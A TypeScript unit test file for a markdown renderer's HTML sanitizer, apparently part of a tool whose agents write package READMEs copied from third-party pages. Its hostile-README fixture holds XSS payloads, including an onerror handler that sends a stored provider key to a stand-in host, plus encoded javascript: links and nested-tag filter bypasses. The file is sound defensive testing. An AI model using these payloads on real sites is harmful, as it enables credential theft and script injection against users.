// Unit tests for the raw-HTML path of the markdown renderer: package Markdown
// is written by capture agents from third-party pages, and this origin holds
// the provider key in localStorage. Run with `pnpm test`.
import assert from "node:assert/strict";
import { describe, it } from "node:test";
import { markdown, sanitizeHtml } from "./markdown.ts";

const hooks = { base: "systems/acme/README.md", allowRawHtml: true };

// A README a capture agent could plausibly write after copying markup from a
// hostile product page. Every line is a raw HTML block the renderer sees.
const HOSTILE_README = [
  "# Acme",
  "",
  `<img src=x onerror="fetch('https://evil.test/?k='+localStorage.getItem('ds-provider'))">`,
  "",
  "<script>alert(1)</script>",
  "",
  '<a href="javascript:alert(1)">docs</a>',
  "",
  '<a href="&#106;avascript&#58;alert(1)">encoded</a> <a href="jav&#x09;ascript:alert(1)">tab</a>',
  "",
  '<div onclick=alert(1) style="position:fixed;inset:0" class="card" data-x="1">box</div>',
  "",
  '<div><svg onload=alert(1)></svg><iframe src="https://evil.test/"></iframe><form action="https://evil.test/"><button>Go</button></form></div>',
  "",
  "<img/src=x/onerror=alert(1)>",
  "",
  '<details open><summary>More</summary><!-- <img src=x onerror=alert(1)> --></details>',
  "",
  '<video src="data:video/mp4;base64,AAAA" poster="javascript:alert(1)" controls></video>',
  "",
  "<div><scr<script>ipt>alert(1)</script></div>",
  "",
].join("\n");

const live = (html: string) => {
  // Every element the browser would build from the output, by tag name.
  const tags = [...html.matchAll(/<([a-z][a-z0-9]*)\b([^>]*)>/gi)];
  return { names: tags.map((t) => t[1].toLowerCase()), attrs: tags.map((t) => t[2]).join(" ") };
};

describe("markdown with allowRawHtml", () => {
  const html = markdown(HOSTILE_README, hooks);
  const { names, attrs } = live(html);

  it("leaves no script-capable element", () => {
    for (const bad of ["script", "svg", "iframe", "form", "button", "style", "object", "embed"])
      assert.ok(!names.includes(bad), `<${bad}> survived: ${html}`);
  });

  it("drops every event handler and style attribute", () => {
    assert.doesNotMatch(attrs, /\bon[a-z]+\s*=/i);
    assert.doesNotMatch(attrs, /\bstyle\s*=/i);
    assert.doesNotMatch(attrs, /\bdata-x\b/);
  });

  it("drops javascript: and data: targets, entity-encoded ones included", () => {
    assert.doesNotMatch(attrs, /javascript|data:/i);
    assert.match(html, /<a>docs<\/a>/);
    assert.match(html, /<a>encoded<\/a> <a>tab<\/a>/);
    assert.match(html, /<video controls><\/video>/);
  });

  it("drops comments and escapes the tags it does not allow", () => {
    assert.doesNotMatch(html, /<!--/);
    // A line starting <script is not a block tag, so it is a paragraph (escaped).
    assert.match(html, /<p>&lt;script&gt;alert\(1\)&lt;\/script&gt;<\/p>/);
    assert.match(html, /<div>&lt;scr&lt;script>ipt>alert\(1\)&lt;\/script><\/div>/);
    assert.match(html, /<div>&lt;svg onload=alert\(1\)>/);
    assert.match(html, /&lt;img\/src=x\/onerror=alert\(1\)>/);
  });

  it("keeps the markup packages really use", () => {
    assert.match(html, /<div class="card">box<\/div>/);
    assert.match(html, /<details open><summary>More<\/summary><\/details>/);
    // A relative image resolves to /media/ the way a Markdown image does.
    assert.match(html, /<img src="\/media\/systems\/acme\/x">/);
  });
});

describe("sanitizeHtml", () => {
  it("keeps a components.md anchor and crop row as written", () => {
    const src =
      '<a id="header"></a>`header`, on home.\n<img src="components/crops/header-default.png" alt="Header, default" height="60">';
    assert.equal(
      sanitizeHtml(src, { base: "systems/acme/components.md" }),
      '<a id="header"></a>`header`, on home.\n<img src="/media/systems/acme/components/crops/header-default.png" alt="Header, default" height="60">',
    );
  });

  it("re-escapes attribute values so quotes cannot break out", () => {
    const out = sanitizeHtml(`<img alt='x" onerror="alert(1)' src="https://cdn.example/a.png">`, { base: "README.md" });
    assert.equal(out, '<img alt="x&quot; onerror=&quot;alert(1)" src="https://cdn.example/a.png">');
  });

  it("keeps safe links and fragments", () => {
    const out = sanitizeHtml('<a href="https://acme.example/docs" target="_blank" rel="noopener">a</a><a href="#setup">b</a>', {
      base: "README.md",
    });
    assert.equal(out, '<a href="https://acme.example/docs" target="_blank" rel="noopener">a</a><a href="#setup">b</a>');
  });

  it("drops closed comments, keeps an unclosed one as text, and stays linear", () => {
    assert.equal(sanitizeHtml("<b>a</b><!-- x -->c", { base: "x.md" }), "<b>a</b>c");
    assert.equal(sanitizeHtml("<b>a</b><!-- x", { base: "x.md" }), "<b>a</b>&lt;!-- x");
    const many = "<!--".repeat(50_000);
    const t = performance.now();
    assert.equal(sanitizeHtml(many, { base: "x.md" }), "&lt;!--".repeat(50_000));
    assert.ok(performance.now() - t < 1000, "unclosed comments rescanned the block");
  });

  it("honours remoteImages off for raw images too", () => {
    assert.equal(sanitizeHtml('<img src="https://tracker.example/p.gif">', { base: "x.md", remoteImages: false }), "<img>");
  });
});

describe("markdown without allowRawHtml", () => {
  it("renders HTML lines as escaped text", () => {
    const html = markdown("<img src=x onerror=alert(1)>", { base: "chat" });
    assert.equal(html, "<p>&lt;img src=x onerror=alert(1)&gt;</p>");
  });
});
